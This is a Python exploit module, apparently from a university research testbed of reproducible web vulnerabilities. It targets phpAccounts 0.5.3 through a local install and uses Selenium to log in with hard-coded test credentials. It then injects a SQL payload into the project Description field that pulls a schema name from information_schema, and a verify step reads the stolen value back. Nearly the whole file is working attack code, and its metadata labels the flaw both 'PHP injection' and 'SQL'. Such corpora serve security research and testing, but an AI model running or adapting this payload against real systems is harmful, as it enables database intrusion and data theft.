
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
from selenium.common.exceptions import NoSuchElementException

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82707E",                        
                  'Description' : "PHP injection vulnerability in New Project action.",
                  'References' : [['OSVDB','82707'],['http://www.osvdb.org/show/osvdb/82707']],
                  'Target' : "phpAccounts 0.5.3",
                  'TargetLicense' : '',
                  'Type' : "SQL",
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return

    def setup(self, target_system_dir):
 
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")
        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=new_client")

        driver.get_element(by_xpath="//input[@value='Submit']").click()
        driver.get_element(by_xpath="//td[contains(text(),'security')]")
        driver.cleanup()
 
        return
        
        

    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")

        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=edit_project")
        driver.get_element(by_xpath="//input[@value='Go']").click()

        driver.get_element(by_xpath="//textarea[@name='Description']").send_keys("comment', '2013-8-10', '2013-8-10' ), ('1','Project2',(select schema_name from information_schema.schemata order by schema_name desc limit 1),'2013-8-10', '2013-8-10' ), ('1','Project3','comment")

        driver.get_element(by_xpath="//input[@value='Submit']").click()

        #just wait until ok appears in textarea before returning
        driver.get_element(by_xpath="//textarea[@name='Description' and contains(text(),'comment')]")

        driver.cleanup()
        return                

    def verify(self):

        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        # log-in as admin
        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")

        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=view_projects")
        
        try:
            celltext = driver.get_element(by_xpath="/html/body/div[2]/table/tbody/tr[4]/td[5]").text
            self.logger.info("Extracted a database name %s", celltext)
            verified = True
        except NoSuchElementException:
            self.logger.error("Injection failed: could not retrieve table name")

        driver.cleanup()
        return verified
